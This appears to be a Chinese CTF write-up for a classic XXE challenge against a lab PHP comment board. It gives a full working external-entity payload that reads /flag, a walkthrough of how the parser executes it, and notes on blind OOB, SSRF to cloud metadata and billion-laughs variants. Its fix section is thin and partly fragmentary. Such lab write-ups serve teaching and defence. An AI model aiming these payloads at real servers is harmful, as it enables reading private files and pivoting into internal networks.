## Q27 - XXE · 经典外部实体读文件

实测地址：`http://192.168.1.100:32807/`

最终 FLAG：`[FLAG 占位]`

## 题目背景

### Note

XML Comment Board：

- 首页写得很直白：`POST /` 发 XML，Content-Type 是 `application/xml`
- 样例结构：`<comment><name>Alice</name><content>hello</content></comment>`
- 接口约定：回显 `<name>` 的内容（`<h2>Thanks, XXX!</h2>`）
- Flag 位置：`/flag`（Web 根外）

出题人给的“回显点”就是 XXE 教科书式的**数据载体** `<name>` 里塞一个外部实体 `&x;`，libxml 会把 `file:///flag` 的文件内容直接替换进去，然后 PHP 再把它拼进 HTML 返回。**一次请求，一次回显，完事。**

## 漏洞本质

XXE = XML External Entity。问题根源：XML 规范允许"实体"引用外部资源，而实体展开发生在 parser 内部，开发者视线之外。

| 认知错位 | 开发者以为 | 实际 |
| --- | --- | --- |
| XML 就是数据结构 | 只表示层次化的名值对 | XML 还是一门带指令的语言，可以引用外部 URI |
| `&entity;` 是转义 | 只是 `&lt;` 这种字符转义 | 可以是**外部实体**：parser 会去读 URL/文件并替换 |
| libxml 安全默认 | 2.9+ 默认禁 XXE | 需显式 `LIBXML_NOENT` 或老代码保留着 `libxml_disable_entity_loader(false)`，都能打开开关 |
| `file://` 协议只是本地提示 | 以为是注释性的 | parser 真的会 `fopen("/flag")` 读字节回来 |

\

四大 XXE 姿势速查：

| 姿势 | 用途 | 关键元素 |
| --- | --- | --- |
| 有回显读文件（本题） | 直接把文件内容拼进响应 | `<!ENTITY x SYSTEM "file:///flag">` + 响应含 `&x;` |
| 盲 XXE OOB（Q28） | 响应不含实体时，走外部 DTD 把数据带出 | 参数实体 `%` + 外部 DTD + HTTP/FTP 外带 |
| 错误消息回显 | 把文件内容塞进报错返回 | `<!ENTITY % err SYSTEM "file:///...">` + 故意错误 |
| SSRF / DoS | 让服务端去访问内网，或展开指数级实体 | `http://169.254.169.254/...` / 十亿实体 |

\

为什么“回显 XXE”是**最简单的分支**：一条 General Entity 即可，无需外部 DTD，无需参数实体 `%`，无需 OOB 基础设施，只要 parser 开了外部实体就彻底完蛋。

### Important

PHP XXE 触发开关（本题必然至少触发其一）：

1. `libxml_disable_entity_loader(false)` - PHP 8 已废弃但老代码还在
2. `LIBXML_NOENT` 作为 `simplexml_load_string/DOMDocument::loadXML` 的 flags
3. `LIBXML_DTDLOAD` + `LIBXML_DTDVALID` 组合
4. 使用的是老版本 libxml2（<2.9）

本题把开关打开了，所以能 `file` 读任意可读文件。

# 关键前置知识

XML 实体的分类：

| 类型 | 语法 | 能干什么 |
| --- | --- | --- |
| 内部通用实体 | `<!ENTITY x "literal">` | 字符串宏替换 |
| 外部通用实体 | `<!ENTITY x SYSTEM "URI">` | 读 URI 并替换（本题用的就是这个） |
| 内部参数实体 | `<!ENTITY % p "literal">` | DTD 内部宏，主要用于盲 XXE |
| 外部参数实体 | `<!ENTITY % p SYSTEM "URI">` | 读 URI 到 DTD 上下文（盲 XXE 核心，Q28 见） |

# Payload 逐字节解析

| 内容 | 说明 |
|---|---|
| `<?xml version="1.0"?>` | XML 声明 |
| `<!DOCTYPE r [` | 内部 DTD 开始（根元素名随便取 `r`） |
| `<!ENTITY x SYSTEM "file:///flag">` | 定义外部通用实体 `&x;`；指向本地 `/flag` |
| `<name>&x;</name>` | 引用实体，parser 展开时 `fopen("/flag")` 并替换 |

[代码块边界]xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY x SYSTEM "file:///flag">
]>
<comment>
  <name>&x;</name>
  <content>c</content>
</comment>
[代码块边界]

执行流：

1. 客户端 POST 这段 XML
2. PHP libxml 解析 → 遇到 `<!DOCTYPE>` → 构建 DTD 上下文
3. 遇到 `&x;` → 查 DTD → 发现是 `SYSTEM file:///flag` → 触发外部实体解析器
4. libxml `open("/flag")` → `read` → UTF-8 解码 → 字符串替换到 `&x;` 的位置
5. 解析完成后，`$comment->name = "[FLAG 占位]"`
6. PHP: `echo htmlspecialchars($comment->name)` → 渲染进 `<h2>Thanks, ... !</h2>`
7. HTTP 响应包含 flag

# 常见坑

| 问题 | 根因 | 解决 |
| --- | --- | --- |
| XXE 不生效，`&x;` 原样显示 | libxml ≥ 2.9 默认禁外部实体 | 本题已开；遇禁用场景改走 Q28 盲 XXE / 换端点 |
| 响应 HTTP 400 | 目标文件不存在，parser 解析失败 | 换文件路径；或用 `php://filter` 防编码问题 |
| flag 含 `<`、`&` 等字符导致 XML 解析炸 | 实体替换后又被当 XML 解析 | `php://filter/convert.base64-encode/resource=...` 避免 |
| flag 含换行被 `htmlspecialchars` 后残留 | 回显前 `\n` 仍在 | 直接看响应 body 首行（HTML 里看源码） |
| 只能读 www-data 有权限的文件 | 进程 UID 限制 | Web 应用 flag 一般 world-readable；否则看 UID 跨权限问题 |
| zsh 历史扩展把 `!DOCTYPE` 吃成历史引用 | `!` 在 zsh 有特殊含义 | `set +H` 关 history expansion，或改 Python/文件投递 |

## XXE 家族进阶 7 谱

Important

1. Classic Read【本题】：有回显 + 通用实体 `SYSTEM file://` → 一发入魂
2. Blind XXE OOB：参数实体 `%` + 外部 DTD + HTTP/DNS 外带（Q28 就是）
3. Error-based XXE：响应里没回显但显示错误栈，把 flag 塞进报错里带出
4. XXE-SSRF：`http://169.254.169.254/` 云元数据 / 内网端口探测
5. XXE-to-RCE：配合 `expect` 协议（很少）、或读 PHP 源码找二次漏洞
6. SOAP / SVG / DOCX / XLSX XXE：这些二进制/文档格式内部都是 XML，MS Office 文档曾遭殃
7. Billion Laughs / Quadratic Blowup：实体递归定义，DoS 内存炸服务（CVE-2003-1564 原始 POC）

## 关键修复

Important

### 修一【核心误导】：禁用外部实体

### 修二：换解析器或解析模式

[代码块边界]php

$xml = simplexml_load_string($raw, 'SimpleXMLElement', LIBXML_NONET);

[代码块边界]php

- 前置 WAF / API Gateway 拦 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM` 关键字
